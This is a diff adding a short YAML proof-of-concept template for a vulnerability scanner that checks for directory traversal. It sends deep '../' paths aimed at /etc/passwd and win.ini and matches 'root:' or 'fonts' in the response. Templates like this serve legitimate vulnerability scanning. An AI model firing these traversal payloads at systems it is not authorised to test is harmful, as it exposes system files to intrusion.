@@ -1,0 +1,13 @@
+name: poc-yaml-Directory-traversal
+
+description: "目录穿越漏洞"
+method: GET
+alwaysExecute: true
+path:
+  - /../../../../../../../../../../../../etc/passwd
+  - /../../../../../../../../../../../../C:/Windows/win.ini
+expression:
+  status: 200
+  body_any:
+    - "root:"
+    - "fonts"
